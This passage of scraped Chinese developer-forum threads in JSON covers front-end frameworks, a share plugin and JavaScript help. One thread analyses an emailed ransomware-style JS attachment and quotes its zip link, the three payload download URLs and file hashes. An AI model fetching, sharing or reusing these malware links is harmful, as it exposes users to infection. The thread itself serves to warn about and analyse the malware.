吧。。", "MVVM 看上去很灵活，开发效率很高。问题在于对开发者没啥约束，只要改数据就影响 UI ，听起来酷炫牛逼，等业务复杂起来，程序员就很可能不知道视图变化是受哪里的数据改动影响了，深入调试起来比较费劲。总之 MVVM 学习曲线前期容易，后期纠结。\r", "React 提倡的单向数据流对开发者的编码习惯存在一定的约束力，数据流转和视图渲染都是树形的，对于非常复杂的业务来说，还是适合下猛药的，但是考虑到这味药确实很猛，破坏力可能会很大，建议谨慎考虑后选择。\r", "另外对于 MVVM 是否适合简单轻量的业务？程序员从来不知道哪天业务会分分钟扩大规模，说不定公司突然安排几位码农进来和你一起开发，到时候人手就不好管理了，七手八脚的，项目代码立马变一坨屎。结论 maybe 还是不适合。", "前端新手，最近都在徘徊 Vue 和 React 之间。但是最后选择了 React ，因为感觉明显的组件化开发个人感觉更加清晰，当然我自己也觉得 Vue 很不错，因为轻量级，而且开发起来应该很爽~同样也很喜欢尤老师。哈哈~", "歪个楼，只有我一个人看懂了楼主的头像了吗。。", "以前不清楚，现在 vue 的状态是不必在 data 里面先返回的   @", "什么都没用过，只是想问下楼上们，为啥没人提 ember.js ？", "Vue 的作者本身就是一个跨艺术和科技界的奇葩\r", "Angular 和 React 都是纯码农最爱 \r", "对于部分跨界认识而言， Vue 显然更入得了他们的法眼", "react 写的是 web app\r", "vue 写的是 web page\r", "（我用 WIN ，忽略大小写……:)", "现在正打算用 vue 写个东西", "没人提 elm-lang 么", "楼主是对的 Follow your heart", "一个个人项目\r", "\r", "用啥都一样", "前端框架挑花了眼？ 建议直接看 “状态管理” 的思路（组件间通信形式的实现办法）\r", " \r", "\r", "无论用哪个，注意一定要有专门的 状态管理 的思路，比如 Redux 或 Vuex \r", "搭配就是 React+Redux 或 Angular+Redux 或 Vue+Vuex \r", "\r", "实际上，如果你觉得 Redux 是必需品，那么就很简单了：谁和它配合最好就选择谁", "既然是个人项目，推荐用这三个框架都实现一遍，你就明白了", "求问 vuejs 怎么学？感觉相关的书有点少（ it-ebook 搜了下）", "react+redux ，开发起来特别爽。", "  直接去官网看教程就好  ", "能好好看文档，写点项目再评价么。。。😂", "上一个项目使用 vue 来做的单页，商业型的项目，使用 vue+vue-router+vue-resource+vue-loader+webpack+gulp+browsersync ，适合单人开发，多人开发时数据状态不好控制，可能使用 vuex 可以解决，没有理解到 flux 架构的设计理念，所以没有使用 vue 。没有使用过 react+redux ，只做过 TODO 的 Demo ，暂时无法评价，客户说要做一个论坛，准备使用 react+redux 深入学习一下 flux 类的架构", " \r", "\r", "这里可以的。 ", "公司全部项目都上 Vue.js 了，不知道会不会被坑死", "Vue 做过个微信项目，很顺手（原本做 ios ）。  独立开发推荐用这个。\r", "React + Redux 刚下载个源码，准备也学习一下。\r", "\r", "个人理解是  Vue  感觉像做 Web Page  ， React + Redux 更像 Web App\r", "\r", "我两个都要学....", "去年秋季用 vue 写的 SPA ，被公司毙掉，很遗憾。\r", "\r", "最后自己把 demo 放到 github 里啦～ [", " ", ")", "React 是必学的, 生态圈太繁荣, 另外 React 开发组的野心比较大, 各平台通吃.\r", "Vue 适合短平快的项目, 大型项目暂时没有什么好的案例, 不过要看你怎么定义\"大\".\r", "\r", "Vue 最大的问题应该是维护人员, 注意, 是人员, 而不是组织, 很多围绕 Vue 的相关工具都是一个或几个人维护的, 如果哪天不高兴了... 不过作者也很清楚这个问题, 已经全职在做 Vue 的开发, 并且开始在招募一起开发维护的人员了.", " 做得可以，为什么会被毙掉？是技术选型问题？", "接受的理由有千千万万，拒绝的理由也有千千万万：\r", "\r", "- 公司内部开发人员无法调配（人手紧缺）\r", "- 加上项目本身不是很独立，以及项目时间的期限\r", "- 技术总监不喜欢这么折腾，只希望项目安全上线\r", "- ……\r", "\r", "最后，自己都撕逼不过后台开发，他们也无法配合我。\r", "\r", "最后的最后，只剩我一个人自嗨啦～", " 看下文档，然后官方有个 HackNews 的 demo ， 这个基本把 vue 那一套都涉及到了。（我就是这样", "用 vue 做开发最好能吃透一部分源码，能搞懂一些内部的东西，不然遇到问题你不好解决，同时也很难 google 到，因为受众较小，资源少。另外用 vue 你就要做好自己写组件的准备，因为很多组件你根本找不到，即便能找到，质量也很难保证。\r", "\r", "用 react 建议你跟着网上大众的做法走，因为实践较多，能碰到的问题基本已经被解决了，相对来说环境好太多，一般的问题 google 一下也是一大堆答案。\r", "\r", "react 入门比 vue 难， vue 要做好比 react 难", " 以前玩过一个叫 native script 的， telerik 家的，收费的，好像是比 react native 还早", "为啥用 Polymer 的人这么少呢", "facebook 自己都用 react 来构建自己的网站……", "凸性自由探索吧。\r", "\r", "用一段时间，发现好，就留下，发现不好，就扔掉。凭空想象这个东西好不好，是想象不出来的。", " 没看懂", " 放大看应该是一颗葡萄吧"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://www.fusetools.com/\" rel=\"nofollow\">https://www.fusetools.com/</a></p>\n</div></div>"], "reply": "8", "tittle": "有人用过 fuse 么，开发 app 可好", "comment": ["一直关注，但是还没有尝试", "这东西目前一直在 beta", "当年用了一次 phonegap, 给我最大的收获就是, 用这些类似概念的货都要小心 xcode 突然更新, 然后如果你这个时候正在开发完要赶时间提交应用的时候, 会有很想屎的冲动, 因为 xcode 一更新很有可能造成类似概念的这些货都无法用了, 你得等他们更新支持新版 xcode 才行.", "为什么在 Python 板块下面？不应该在 JS 下面吗？", "   现在感觉如何， phonegap 貌似已经很成熟的样子。", " 建议移动", " \r", " \r", "\r", "谢谢，已经移动。", " 我已经很熟练的用 OC 或者 swift 开发 iOS 的 App 了, 所以什么是 phonegap?"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h3><a href=\"https://github.com/zhansingsong/iShare.js\" rel=\"nofollow\"><strong>iShare.js</strong></a>是一个小巧的分享插件，纯 JS 编写，不依赖任何第三方库，使用简便。</h3>\n<h3>为啥写这个插件？</h3>\n<blockquote>\n<p>因为在搭建个人 blog 时（还没有搭建好(¯﹃¯)），对目前国内比较受欢迎的分享插件都不太满意，主要如下几点：</p>\n<ul>\n<li>不太喜欢官方提供的样式，想重新定制，但又不太方便</li>\n<li>提供的大部分接口都没用到，真正用到就那么几个，显得有点冗余</li>\n<li>没有进行更新维护，部分接口都是挂掉</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>另外，工作中，有时想要一个可以自定义样式、支持常用的分享接口、使用方便、不依赖于第三库的独立库。比如写活动页面时(⊙﹏⊙)</p>\n</blockquote>\n<p><strong>基于上述原因自己就创建了 iShare.js ，并为自定义样式的创建方式定制了专门的精简版： iShare_tidy</strong></p>\n<p><img alt=\"isharejs\" src=\"https://raw.githubusercontent.com/zhansingsong/iShare.js/master/isharejs.png\"></p>\n<h3>支持分享接口</h3>\n<ul>\n<li>QQ 好友</li>\n<li>QQ 空间</li>\n<li>腾讯微博</li>\n<li>新浪微博</li>\n<li>微信</li>\n<li>豆瓣</li>\n<li>人人</li>\n<li>有道笔记</li>\n<li>Linkedin</li>\n<li>Facebook</li>\n<li>Twitter</li>\n<li>Google+</li>\n<li>Pinterest</li>\n<li>Tumblr</li>\n</ul>\n<h2>使用</h2>\n<h3>支持两种初始化方式：</h3>\n<ul>\n<li>单例模式</li>\n<li>实例化模式</li>\n</ul>\n<p><strong>注意：不要同时使用两种模式</strong></p>\n<h3>单例模式</h3>\n<p>本实例展示了自定义样式分享的创建过程。另外本库针对自定义样式的创建提炼出一个精简版本：<strong>iShare_tidy 版本</strong></p>\n<pre><code>// 引入脚本文件\n&lt;script type=\"text/javascript\" src=\"iShare_tidy.js\"&gt;&lt;/script&gt;\n</code></pre>\n<pre><code>// 引入 HTML 脚本\n&lt;div class=\"iShare iShare1\"&gt;\n\t&lt;a href=\"#\" class=\"iShare_qzone\"&gt;&lt;i class=\"iconfont qzone\"&gt;&amp;#xe610;&lt;/i&gt;&lt;/a&gt;\n\t&lt;a href=\"#\" class=\"iShare_tencent\"&gt;&lt;i class=\"iconfont tencent\" style=\"vertical-align: -2px;\"&gt;&amp;#xe608;&lt;/i&gt;&lt;/a&gt;\n\t&lt;a href=\"#\" class=\"iShare_weibo\"&gt;&lt;i class=\"iconfont weibo\"&gt;&amp;#xe609;&lt;/i&gt;&lt;/a&gt;\n\t&lt;a href=\"#\" class=\"iShare_wechat\"&gt;&lt;i class=\"iconfont wechat\" style=\"vertical-align: -2px;\"&gt;&amp;#xe613;&lt;/i&gt;&lt;/a&gt;\n\t&lt;a href=\"#\" class=\"iShare_facebook\"&gt;&lt;i class=\"iconfont facebook\" style=\"vertical-align: 1px;\"&gt;&amp;#xe601;&lt;/i&gt;&lt;/a&gt;\n\t&lt;a href=\"#\" class=\"iShare_googleplus\"&gt;&lt;i class=\"iconfont googleplus\" style=\"vertical-align: -1px;\"&gt;&amp;#xe60b;&lt;/i&gt;&lt;/a&gt;\n\t&lt;a href=\"#\" class=\"iShare_linkedin\"&gt;&lt;i class=\"iconfont linkedin\" style=\"vertical-align: 2px;\"&gt;&amp;#xe607;&lt;/i&gt;&lt;/a&gt;\n\t&lt;a href=\"#\"&gt;我是酱油一号&lt;/a&gt;\n\t&lt;a href=\"#\"&gt;我是酱油二号&lt;/a&gt;\n&lt;/div&gt;\n//子元素需要指定如下的类名：\n//iShare_qq         : 'QQ 好友',\n//iShare_qzone      : 'QQ 空间',\n//iShare_tencent    : '腾讯微博',\n//iShare_weibo      : '新浪微博',\n//iShare_wechat     : '微信',\n//iShare_douban     : '豆瓣',\n//iShare_renren\t\t\t: '人人',\n//iShare_youdaonote : '有道笔记',\n//iShare_linkedin   : 'Linkedin',\n//iShare_facebook   : 'Facebook',\n//iShare_twitter    : 'Twitter',\n//iShare_googleplus : 'Google+',\n//iShare_pinterest\t: 'Pinterest',\n//iShare_tumblr\t\t\t: 'Tumblr'\n//插件会根据类名自动处理，如果存在不包含上述类名的子元素，该元素就不作任何处理。\n</code></pre>\n<pre><code>// 配置全局变量 iShare_config\n&lt;script type=\"text/javascript\"&gt;\niShare_config = {container:'.iShare1',config:{\n\t\ttitle: '分享标题',\n\t\tdescription: '这是分享描述文本',\n\t\turl: 'https://github.com/zhansingsong',\n\t\tWXoptions:{\n\t\t\tevenType: 'click',\n\t\t\tisTitleVisibility: true,\n\t\t\ttitle: '二维码标题',\n\t\t\tisTipVisibility: true,\n\t\t\ttip: '二维码描述文本',\n\t\t\tbgcolor: '#2BAD13',\n\t\t}\n\t}};\n&lt;/script&gt;\n</code></pre>\n<h3>实例化模式</h3>\n<pre><code>// 引入样式文件(自定义样式可以不用引入)\n&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"./style/fonts/iconfont.css\"&gt;\n&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"./style/css/ishare.css\"&gt;\n</code></pre>\n<pre><code>// 引入脚本文件\n&lt;script href=\"javascript:;\" type=\"text/javascript\" src=\"iShare.js\"&gt;&lt;/script&gt;\n</code></pre>\n<pre><code>// 引入 HTML 脚本\n&lt;div class=\"iShare iShare-16 iShareClassName\"&gt;&lt;/div&gt; // 容器类名选择器: \"iShareClassName\"\n</code></pre>\n<pre><code>// 实例化对象\n&lt;script type=\"text/javascript\"&gt;\n\t(new iShare({container:'.iShare1',config:{\n\t\ttitle: '分享标题',\n\t\tdescription: '这是分享描述文本',\n\t\turl: 'https://github.com/zhansingsong',\n\t\tisAbroad: false,\n\t\tisTitle: true,\n\t\tinitialized: true,\n\t\tWXoptions:{\n\t\t\tevenType: 'click',\n\t\t\tisTitleVisibility: true,\n\t\t\ttitle: '二维码标题',\n\t\t\tisTipVisibility: true,\n\t\t\ttip: '二维码描述文本',\n\t\t\tbgcolor: '#2BAD13',\n\t\t}\n\t}}));\n&lt;/script&gt;\n</code></pre>\n<h3>更多详情请参考 DEMO</h3>\n<ul>\n<li><a href=\"http://zhansingsong.github.io/demo/iShare.html\" rel=\"nofollow\">iShare 版本</a></li>\n<li><a href=\"http://zhansingsong.github.io/demo/iShare_tidy.html\" rel=\"nofollow\">iShare_tidy 版本</a></li>\n</ul>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><h2>DEMO预览图：</h2>\n<p><img alt=\"\" src=\"https://raw.githubusercontent.com/zhansingsong/iShare.js/master/demo.gif\"></p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><h2>更新1.1.0版本</h2>\n<h4>1.1.0版本中更新了二维码的生成方式</h4>\n<p>定制二维码的样式DEMO:\n<img alt=\"img\" src=\"https://raw.githubusercontent.com/zhansingsong/iShare.js/master/ishare.png\"></p>\n</div></div>"], "reply": "4", "tittle": "iShare.js 分享插件", "comment": ["不错，很简洁～", "感谢楼主分享", "我想吐槽下 iShare_tidy 的命名，有驼峰有下划线，强迫症伤不起", " 谢谢反馈！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>[QuestionDto [wentId=688, id=1, wenTi=one1, daAn=哎哟 不错 你答对了, daAn_div=null, fundcode=17A0SS], QuestionDto [wentId=689, id=2, wenTi=1213, daAn=2131312, daAn_div=null, fundcode=17A0SS]] <br>\n注： QuestionDto 是个数组</p>\n</div></div>"], "reply": "3", "tittle": "求解，这种格式字符串如何转化成 json", "comment": ["正则\r", "\r", "JSON.stringify(\r", "'[QuestionDto [wentId=123, id=1, wenTi=one1, daAn=哎哟 不错 你答对了, daAn_div=null, fundcode=XXXXXX]]'\r", ".match(/^\\[QuestionDto \\[(.*)\\]\\]$/)[1]\r", ".split(', ')\r", ".map(function(o){ o=o.split('='); var ret={}; ret[o[0]]=o[1]; return ret;}));", "  多个 dto 会有问题", " \"[{\"wentId\":\"688\"},{\"id\":\"1\"},{\"wenTi\":\"one1\"},{\"daAn\":\"哎哟&nbsp;不错&nbsp;你答对了\"},{\"daAn_div\":\"null\"},{\"fundcode\":\"17A0SS]\"},{\"QuestionDto [wentId\":\"689\"},{\"id\":\"2\"},{\"wenTi\":\"1213\"},{\"daAn\":\"2131312\"},{\"daAn_div\":\"null\"},{\"fundcode\":\"17A0SS\"}]\"\r", "大概思路有了，我自己试下吧。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>链接 <a href=\"http://www.mtkan.cc/unpaid_188.zip\" rel=\"nofollow\">http://www.mtkan.cc/unpaid_188.zip</a></p>\n</div></div>"], "reply": "19", "tittle": "收到一封奇怪的邮件，里面就一个 js 文件", "comment": ["除了是病毒以外想不到别的解释。", "勒索软件，点开你就 gg 了\r", "不过我的 js 文件关联的是 notepad++", "这个代码混淆的有点强啊\r", "我弄了半天 最后终于看不下去了", "大概研究成果如下\r", "\r", "会在这个链接 ", "\r", "进行下载 exe 并运行", " 是么 大概扫了一眼不就是[]里的符号直接 join 就可以", "只是去掉了没用的字符，各种混淆不想还原了 ", "WScript...一看就是要干坏事", "chrome 提示是病毒", "进一步还原一下, 便于阅读的版本:  ", "\r", "\r", "从代码上来看, 基本上就是用 xmlhttp 下载文件, 然后对下载到的文件进行一些解码, 然后保存为最终要执行的 exe 文件,\r", "并在执行的时候 传入 321 这个参数.\r", "\r", "要下载的文件有三个地址.\r", "var UIUr7 = [\"http://babycotsonline.com/hiy96z\", \"http://3141592.ru/rvhijql\", \"http://sherlock.uvishere.com/2ujlndd\"];\r", "目前我这边可以下载成功的是第三个文件, 下载到的文件是经过编码的(或者说是加密的), 然后在 js 里完成解码(解密), 然后再保存至 TEMP 目录, 并调用它.", "没有下载，猜测应该和这个有关联 ", "最后得到了这个玩意 \r", "\r", "\r", "文件 SHA: F18C67DF41568549BE32B93934F9EF836FAC03D2\r", "MD5:       91908E93FA66AFA8FD7E995A5AA4F006", "看起来只能在 Windows 上运行", "邮件详情：\r", "\r", " \r", "\r", "发件人地址： ", " 只是病毒而已，别纠结了，我这隔几天收一封，已经收了几百封了。", "勒索病毒。别乱点。。", "赶紧买瓶 84 ，到邮箱里消消毒。", "chrome 提示是病毒", "下个 exe= =。。需求分析不彻底啊， Mac 用户怎么办？"]},
{"content": ["<div class=\"topic_content\"><div><a target=\"_blank\" href=\"https://gist.github.com/anonymous/7d046f1c5b207342c1ea041a7d2262d6\">https://gist.github.com/anonymous/7d046f1c5b207342c1ea041a7d2262d6</a> <button onclick=\"lazyGist(this)\"> 显示 Gist 代码 </button></div>\r<br>这是代码，没有混淆的，只是命名都是以单字母的\r<br>功能就是解密一段字符串\r<br> for 循环里面的变量太多了，还包含了很多函数\r<br>所以看不太明白\r<br>能简化成通俗易懂的格式或者直接翻译成 C# 或者 Python 的 联系我 QQ:1069689491</div>"], "reply": "12", "tittle": "付费简化或者翻译这一小段 JS 代码。", "comment": ["这还不是混淆的……\r", "233333", "这还不是混淆？那什么是混淆？", "你应该说出多少钱 233", "javascript\r", "```\r", "\r", "DecodeSomething = function(type, str) {\r", "\t//如果没有传入类型或者字符串(str), 则返回 空数组\r", "\tif (!type || void 0 === str){\r", "\t\treturn [];\r", "\t}\r", "\r", "\tvar decode = function(str) {\r", "\t\tvar b,\r", "\t\t\tc = [],\r", "\t\t\td = 3,\r", "\t\t\te = function(a) {//如果字符在 0-9 之间, 则返回它所对应的数字\r", "\t\t\t\tif(a >= \"0\" && \"9\" >= a){\r", "\t\t\t\t\treturn parseInt(a, 10);\r", "\t\t\t\t}else{//否则返回 它的 unicode 值 减去 87\r", "\t\t\t\t\treturn a.charCodeAt(0) - 87;\r", "\t\t\t\t}\r", "\t\t\t}, f = function(str, index) {\r", "\t\t\t\tvar c = e(str[index]),\r", "\t\t\t\t\td = e(str[index + 1]) & 15,\r", "\t\t\t\t\tf = (12 & c) >> 2,\r", "\t\t\t\t\tg = (2 & c) > 0,\r", "\t\t\t\t\th = (1 & c) > 0;\r", "\r", "\t\t\t\treturn {\r", "\t\t\t\t\tplayerPair: g,\r", "\t\t\t\t\twinner: f,\r", "\t\t\t\t\tbankerPair: h,\r", "\t\t\t\t\tvalue: d\r", "\t\t\t\t}\r", "\t\t\t};\r", "\r", "\t\t//遍历字符串\r", "\t\tfor (var index = 0; index < str.length - 1; index += 2){//一次处理两个字符\r", "\t\t\tb = f(str, index);\r", "\r", "\t\t\tif(b.winner !== d){//如果 winner 的值 不等于 3\r", "\t\t\t\tc.push(b);//则添加到 数组 c 里面\r", "\t\t\t}else{\r", "\t\t\t\tc = [];//否则 清空数组\r", "\t\t\t}\r", "\t\t}\r", "\r", "\t\treturn c;//返回数组 c\r", "\t};\r", "\r", "\r", "\tswitch (type) {\r", "\t\tcase \"7bal\":\r", "\t\tcase \"bal\":\r", "\t\t\treturn decode(str);\r", "\t\tcase \"rol\":\r", "\t\tcase \"rofl\":\r", "\t\t\treturn str.split(\";\").map(function(val) {\r", "\t\t\t\treturn {\r", "\t\t\t\t\tresult: val\r", "\t\t\t\t}\r", "\t\t\t});\r", "\t\tdefault:\r", "\t\t\treturn str\r", "\t}\r", "}\r", "\r", "var a = \"60o0749460o07134482\";\r", "console.log(JSON.stringify(DecodeSomething(\"bal\", a)));\r", "```\r", "\r", "python\r", "```\r", "import string, json\r", "\r", "\r", "def char2int(s):\r", "  if s >= '0' and s <= '9':\r", "    return int(s)\r", "  else:\r", "    return ord(s) - 87\r", "\r", "\r", "def decode(str):\r", "  c = char2int(str[0])\r", "  d = char2int(str[1]) & 15\r", "  f = (12 & c) >> 2\r", "  g = (2 & c) > 0\r", "  h = (1 & c) > 0\r", "\r", "  return {'value': d, 'winner': f, 'playerPair': g, 'bankerPair': h}\r", "\r", "\r", "def DecodeSomething(type, data):\r", "  c = []\r", "\r", "  if type in ['7bal', 'bal']:\r", "    for x in range(0, len(data) - 1, 2):\r", "      d = decode(data[x:x+2])\r", "\r", "      if d['winner'] != 3:\r", "        c.append(d)\r", "      else:\r", "        c = []\r", "\r", "    return c\r", "\r", "  elif type in ['rol', 'rofl']:\r", "    d = data.split(\";\")\r", "\r", "    for x in d:\r", "      c.append({\"result\": x})\r", "\r", "    return c\r", "  else:\r", "    return data\r", "\r", "\r", "print json.dumps(DecodeSomething(\"bal\", \"60o0749460o07134482\"))\r", "\r", "print json.dumps(DecodeSomething(\"rol\", \"aa2;asd;42\"))\r", "```\r", "\r", "\r", "以上内容已发到你的 QQ 邮箱(鉴于 V2EX 对于回复的内容里有代码不够友好的原因, 发邮件给你了).", "``` javascript  \r", "\r", "DecodeSomething = function(type, str) { \r", "//如果没有传入类型或者字符串(str), 则返回 空数组 \r", "if (!type || void 0 === str){ \r", "return []; \r", "} \r", "\r", "var decode = function(str) { \r", "var b, \r", "c = [], \r", "d = 3, \r", "e = function(a) {//如果字符在 0-9 之间, 则返回它所对应的数字 \r", "if(a >= \"0\" && \"9\" >= a){ \r", "return parseInt(a, 10); \r", "}else{//否则返回 它的 unicode 值 减去 87 \r", "return a.charCodeAt(0) - 87; \r", "} \r", "}, f = function(str, index) { \r", "var c = e(str[index]), \r", "d = e(str[index + 1]) & 15, \r", "f = (12 & c) >> 2, \r", "g = (2 & c) > 0, \r", "h = (1 & c) > 0; \r", "\r", "return { \r", "playerPair: g, \r", "winner: f, \r", "bankerPair: h, \r", "value: d \r", "} \r", "}; \r", "\r", "//遍历字符串 \r", "for (var index = 0; index < str.length - 1; index += 2){//一次处理两个字符 \r", "b = f(str, index); \r", "\r", "if(b.winner !== d){//如果 winner 的值 不等于 3 \r", "c.push(b);//则添加到 数组 c 里面 \r", "}else{ \r", "c = [];//否则 清空数组 \r", "} \r", "} \r", "\r", "return c;//返回数组 c \r", "}; \r", "\r", "\r", "switch (type) { \r", "case \"7bal\": \r", "case \"bal\": \r", "return decode(str); \r", "case \"rol\": \r", "case \"rofl\": \r", "return str.split(\";\").map(function(val) { \r", "return { \r", "result: val \r", "} \r", "}); \r", "default: \r", "return str \r", "} \r", "} \r", "\r", "var a = \"60o0749460o07134482\"; \r", "console.log(JSON.stringify(DecodeSomething(\"bal\", a))); \r", "``` \r", "\r", "python \r", "``` \r", "import string, json \r", "\r", "\r", "def char2int(s): \r", "if s >= '0' and s <= '9': \r", "return int(s) \r", "else: \r", "return ord(s) - 87 \r", "\r", "\r", "def decode(str): \r", "c = char2int(str[0]) \r", "d = char2int(str[1]) & 15 \r", "f = (12 & c) >> 2 \r", "g = (2 & c) > 0 \r", "h = (1 & c) > 0 \r", "\r", "return {'value': d, 'winner': f, 'playerPair': g, 'bankerPair': h} \r", "\r", "\r", "def DecodeSomething(type, data): \r", "c = [] \r", "\r", "if type in ['7bal', 'bal']: \r", "for x in range(0, len(data) - 1, 2): \r", "d = decode(data[x:x+2]) \r", "\r", "if d['winner'] != 3: \r", "c.append(d) \r", "else: \r", "c = [] \r", "\r", "return c \r", "\r", "elif type in ['rol', 'rofl']: \r", "d = data.split(\";\") \r", "\r", "for x in d: \r", "c.append({\"result\": x}) \r", "\r", "return c \r", "else: \r", "return data \r", "\r", "\r", "print json.dumps(DecodeSomething(\"bal\", \"60o0749460o07134482\")) \r", "\r", "print json.dumps(DecodeSomething(\"rol\", \"aa2;asd;42\")) \r", "```", "奇怪 好像 markdown 不支持？", "访问不了 gist..", "那什么是混淆 2333333", "还好了，不长", "大哥参数都 abcd 了 还不混淆。", "  谢谢了 非常感谢 可以加个 QQ 多个朋友 呵呵", "  要梯子"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>https://vnet.link\n鼠标 hover 的地方会出现拓扑动画，看到好几个网站在用了\n有没有好心人给个关键词提示？</p>\n</div></div>"], "reply": "9", "tittle": "求问此交互页面用了什么 JavaScript 库？", "comment": ["F12 一下，我看到了一个<canvas>标签，应该是自定义的样式", "Particles.js", "应该是这三个在起作用\r", " <canvas id=\"star\" class=\"hidden-xs\" style=\"height:100vh;position: absolute\"></canvas>\r", " ", "\r", " ", "介个应该可以\r", "\r", "极光首页也是这效果， js 好像不一样", "这个有类似的效果， ", "\r", "demo ： ", "这是否是一个鼠标跟随啦？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>var Namespace=(function(windows){\n\tvar _toArray = function(obj) {\n\t\t// checks if it's an array\n\t\tif (typeof(obj) == 'object' &amp;&amp; obj.sort) {\n\t\t\treturn obj;\n\t\t}\n\t\treturn new Array(obj);\n\t};\n\tvar _namespace = function(identifier) {\n\t\tvar klasses = arguments[1] || false;\n\t\tvar ns = windows;\n\t\t\n\t\tif (identifier != '') {\n\t\t\tvar parts = identifier.split(Namespace.separator);\n\t\t\tfor (var i = 0, j = parts.length; i &lt; j; i++) {\n\t\t\t\tif (!ns[parts[i]]) {\n\t\t\t\t\tns[parts[i]] = {};\n\t\t\t\t}\n\t\t\t\tns = ns[parts[i]];\n\t\t\t}\n\t\t}\n\t\t\n\t\tif (klasses) {\n\t\t\tfor (var klass in klasses) {\n\t\t\t\tns[klass] = klasses[klass];\n\t\t\t}\n\t\t}\n\t\t\n\t\t//_dispatchEvent('create', { 'identifier': identifier });\n\t\treturn ns;\n\t};\n\t_namespace.use = function(identifier,isglobal) {\n\t\tvar _varscope =isglobal?windows:{};\n\t\tvar identifiers \t\t= _toArray(identifier);\n\t\tvar callback \t\t\t= arguments[1] || false;\n\t\t\n\t\tfor (var i = 0, j = identifiers.length; i &lt; j; i++) {\n\t\t\tidentifier = identifiers[i];\n\t\t\n\t\t\tvar parts = identifier.split(Namespace.separator);\n\t\t\tvar target = parts.pop();\n\t\t\tvar ns = _namespace(parts.join(Namespace.separator));\n\t\t\n\t\t\tif (target == '*') {\n\t\t\t\t// imports all objects from the identifier, can't use include() in that case\n\t\t\t\tfor (var objectName in ns) {\n\t\t\t\t\t_varscope[objectName] = ns[objectName];\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\t// imports only one object\n\t\t\t\tif (ns[target]) {\n\t\t\t\t\t// the object exists, import it\n\t\t\t\t\t_varscope[target] = ns[target];\n\t\t\t\t}\n\t\t\t}\n\t\t\n\t\t}\n\t\treturn _varscope;\n\t};\n\treturn _namespace;\n})(window)\n$.ajaxSetup({\n  cache: true\n});\nNamespace.separator = '.';\n\n</code></pre>\n<p>使用方式是：</p>\n<pre><code>var _Constant = Namespace('all.constant');\n    require(['commonutil'], function(ajaxUtil) {\n        ajaxUtil.callrest('/bases/v1/sso/token', function(data) {\n            if (data.code == \"000000\") {\n                var _Constant = Namespace('all.constant');\n                _Constant.TOKEN = data.data.TOKEN;\n            }\n        }, {}, false);\n    });\n\n</code></pre>\n</div></div>"], "reply": "3", "tittle": "谁能看看这段 javascript 代码是什么含义?实现了什么功能？", "comment": ["相当于这样\r", "require(['commonutil'], function(ajaxUtil) {\r", "    ajaxUtil.callrest('/bases/v1/sso/token', function(data) {\r", "        if (data.code == \"000000\") {\r", "            window.all = window.all || {};\r", "            window.all.constant = window.all.constant || {};\r", "            var _Constant = window.all.constant;\r", "            _Constant.TOKEN = data.data.TOKEN;\r", "        }\r", "    }, {}, false);\r", "});", " 请问这样做的目的是什么？是防止污染全局命名空间么？", " 方便创建深层次的对象"]},
{"content": ["<div class=\"topic_content\">提供需要穷举的内容之后输出所有结果</div>"], "reply": "15", "tittle": "JavaScript 有没有现成的穷举函数呢？", "comment": ["没用过 js ，不过貌似 array 有 map 方法？\r", "没太明白你想干什么。", " \r", " 比如 输入 26 个字母 10 个数字   输出这些字母和数字的所有组合", " 自己写咯", "1,2,3,4].forEach(function(i){console.log(i)})", "[1,2,3,4].forEach(function(i){console.log(i)})", "用 underscore 也可以\r", "\r", "_.map([1,2,3,4], function(i){console.log(i)})", "就一行代码的事而已，哪里那么复杂……\r", "var a = [1,2,3,4];\r", "var b = ['a','b','c','d'];\r", "var c = a.map((a_i) => b.map((b_i) => ([a_i, b_i]))).reduce((l, r) => r.concat(l));", " 你所说的组合是任意长度的吗？还是 36 ？", "javaScript 不提供 concatMap 真蛋疼……", "ES6 还有 Map, WeakMap, Iterator, for...of...", " lz 要的是全排列函数还是只是要输出 1a ， 2a...1b, 2b 这样的东西？\r", "如果是全排列，原生 js 应该是没有这样的排列函数的，不过网上算法很多，另外提个建议，算法写出来后不要企图将结果写入一个文件(针对 26 字母+10 数字)…\r", "\r", "如果是后面的，随便写个 for 循环就好了吧 =。=", "楼主需要的是排列组合的库 js-combinatorics\r", "别人封装好的库算不算现成的？", "Array 有 reduce 方法啊", " 赞"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>今天闲得无聊想弄 AJAX ，然后一下午的时间就弄出了这个玩意：</p>\n<p><a href=\"https://gist.github.com/DoraJDJ/4ef581e202f5dcf4dd5245500d8aebdc\" rel=\"nofollow\">https://gist.github.com/DoraJDJ/4ef581e202f5dcf4dd5245500d8aebdc</a></p>\n<p>功能也很简单，就是利用 jQuery 和 AJAX ，从我在本机上开的一个 API 服务器里获取数据，然后将信息整理成 HTML 写进去。</p>\n<p>虽然我在本机里运行速度较快（排除服务端因素），但我还是觉得代码有点乱，比如下面这个处理日期时间的部分：</p>\n<pre><code>var dateStr = date.getFullYear() + '-' + (date.getMonth() + 1) + '-' + date.getDate() + ' ' + date.getHours() + ':' + date.getMinutes();\n</code></pre>\n<p>虽然处理日期可以用 Moment.js 完成，但是我不怎么喜欢在前端里使用过于多的 JS 库，所以在这部分我写的过于长而复杂，感觉会影响一定的性能（？）。</p>\n<p>我想在此请教一下，这个代码需不需要做一些优化或修正，以及写 JS 代码的一些技巧？</p>\n</div></div>"], "reply": "31", "tittle": "新人求解，如何编写更加高性能的 Javascript 代码？", "comment": ["多写，多尝试重写，周而复始，水平和思路自然会提高一些。\r", "针对某一行代码，告诉你有什么奇技淫巧，不一定对编程的思路和角度有提升。", "“不怎么喜欢在前端里使用过于多的 JS 库”，就我个人而言，是赞成你这个观点的。\r", 